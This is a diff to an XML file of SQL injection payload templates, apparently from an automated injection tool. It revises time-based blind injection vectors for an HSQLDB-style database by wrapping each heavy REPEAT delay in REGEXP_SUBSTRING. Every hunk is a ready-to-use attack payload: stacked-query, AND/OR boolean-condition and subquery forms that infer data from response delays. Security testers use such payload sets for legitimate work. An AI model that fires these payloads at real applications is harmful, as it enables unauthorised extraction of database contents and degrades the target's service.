@@ -2314,9 +2314,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) END</vector>
+        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
-            <payload>;CALL REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000)</payload>
+            <payload>;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2335,9 +2335,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) END</vector>
+        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
-            <payload>;CALL REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000)</payload>
+            <payload>;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2823,9 +2823,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -2843,9 +2843,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2864,9 +2864,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -2884,9 +2884,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3124,9 +3124,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3144,9 +3144,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3165,9 +3165,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3185,9 +3185,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3524,9 +3524,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3544,9 +3544,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3744,9 +3744,9 @@ Formats:
         <risk>2</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3765,9 +3765,9 @@ Formats:
         <risk>2</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
